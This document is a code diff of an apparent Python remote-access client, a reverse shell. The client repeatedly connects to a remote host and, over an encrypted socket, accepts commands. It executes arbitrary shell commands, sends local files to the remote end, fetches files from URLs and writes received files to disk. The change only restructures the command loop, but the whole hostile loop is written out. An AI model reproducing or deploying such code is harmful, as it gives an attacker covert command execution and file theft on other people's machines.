@@ -65,35 +65,35 @@ while True:
   try:
     sock = socket.socket()
     sock.connect((HOST, PORT))
-
-    cipher = get_cipher()
-    decipher = get_cipher()
-
-    while True:
-      data = Receive(sock, decipher)
-
-      if not data:
-        sock.close()
-        break
-
-      if type(data) == str:
-        if data.startswith('dl '):
-          ret = upload(sock, data[3:])
-        elif data.startswith('dlhttp '):
-          ret = dlhttp(sock, data[7:])
-        else:
-          ret = run(data)
-      else:
-        try:
-          f = open(data[0], 'wb')
-          f.write(data[1])
-          f.close()
-          ret = 'File received 🍺'
-        except Exception as e:
-          ret = str(e) + ' ⚠️'     
-       
-      Send(sock, cipher, res(ret))
   except socket.error:
     sock.close()
     time.sleep(10)
     continue
+
+  cipher = get_cipher()
+  decipher = get_cipher()
+
+  while True:
+    data = Receive(sock, decipher)
+
+    if not data:
+      sock.close()
+      break
+
+    if type(data) == str:
+      if data.startswith('dl '):
+        ret = upload(sock, data[3:])
+      elif data.startswith('dlhttp '):
+        ret = dlhttp(sock, data[7:])
+      else:
+        ret = run(data)
+    else:
+      try:
+        f = open(data[0], 'wb')
+        f.write(data[1])
+        f.close()
+        ret = 'File received 🍺'
+      except Exception as e:
+        ret = str(e) + ' ⚠️'     
+       
+    Send(sock, cipher, res(ret))
